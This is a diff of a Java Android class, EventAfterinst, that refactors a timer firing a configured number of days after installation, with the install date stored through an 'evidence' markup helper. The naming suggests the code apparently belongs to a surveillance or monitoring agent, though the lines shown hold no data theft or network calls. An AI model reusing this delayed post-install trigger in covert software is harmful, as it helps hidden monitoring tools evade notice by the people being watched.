@@ -6,29 +6,28 @@ import java.util.Date;
 import java.util.GregorianCalendar;
 import java.util.TimeZone;
 
+import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.Markup;
 
-public class EventAfterinst extends BaseTimer {
+public class EventAfterinst extends BaseTimer implements WaitCallback {
 
 	private int days;
 	private Date date;
 
 	@Override
-	protected boolean parse(EventConf conf) {		
+	protected boolean parse(ConfEvent conf) {
 		try {
-			days=conf.getInt("days");
+			days = conf.getInt("days");
 			Markup markup = new Markup(this);
 			Date now = new Date();
-			if(markup.isMarkup()){
+			if (markup.isMarkup()) {
 				date = (Date) markup.readMarkupSerializable();
-			}else{
+			} else {
 				date = now;
 				markup.writeMarkupSerializable(date);
 			}
-			
-		
-			
+
 		} catch (ConfigurationException e) {
 			return false;
 		} catch (IOException e) {
@@ -38,32 +37,32 @@ public class EventAfterinst extends BaseTimer {
 	}
 
 	@Override
-	public void go() {
-		triggerStartAction();
-	}
-
-	@Override
-	public void begin() {
+	protected void actualEnable() {
 		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
 		calendar.setTime(date);
-		long nowMillis  = calendar.getTimeInMillis();
-		
+		long nowMillis = calendar.getTimeInMillis();
+
 		calendar.add(Calendar.DAY_OF_MONTH, days);
-		long triggerMillis  = calendar.getTimeInMillis();
-		
+		long triggerMillis = calendar.getTimeInMillis();
+
 		long delay = triggerMillis - nowMillis;
-		if(delay>0){
-			setDelay(delay);
-			setPeriod(getDelay());
-		}else{
-			setDelay(0);
-		}
+
+		startAsyncWait(this, delay);
+		
 	}
 
+	
 	@Override
-	public void end() {
-		setDelay(NEVER);
-		setPeriod(NEVER);
+	protected void actualDisable() {
+		stopCondition();
+	}
+
+	public boolean afterWait(boolean interrupted) {
+		if(!interrupted){
+			startCondition();
+		}
+		
+		return interrupted;
 	}
 
 }
